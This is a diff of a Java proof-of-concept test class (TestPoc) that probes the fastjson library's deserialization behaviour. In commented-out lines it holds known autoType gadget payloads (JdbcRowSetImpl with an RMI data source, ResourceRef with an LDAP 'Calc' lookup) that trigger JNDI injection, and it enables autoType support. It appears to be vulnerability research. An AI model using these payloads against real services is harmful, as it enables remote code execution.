@@ -35,14 +35,15 @@ public class TestPoc {
 //      String str = "{\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43658\",\"autoCommit\":true}}";
 //    String str = "{\"@type\":\"org.springframework.security.web.savedrequest.DefaultSavedRequest\",\"contextPath\": {\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:43658/Calc\"}}";
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        String str = "{\"a\": {\"$ref\":\"$.class\"}}";
-        AAA aaa = JSON.parseObject(str, AAA.class);
+//        String str = "{\"a\": {\"$ref\":\"$.class\"}}";
+//        AAA aaa = JSON.parseObject(str, AAA.class);
 //        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 //        String str = "{\"a\": {\"$ref\": \"$.a\"}, \"b\": {\"$ref\": \"$.b\"}, \"c\": {\"$ref\": \"$.c\"}, \"d\": {\"$ref\": \"$.d\"}}";
 //        JSON.parseObject(str, AAA.class);
 //        AAA aaa = new AAA();
-        System.out.println(aaa.getA());
-
+//        System.out.println(aaa.getA());
+        String json = "{\"\"}";
+        JSON.parse(json);
 //    JSON.parseObject(str);
     }
 }
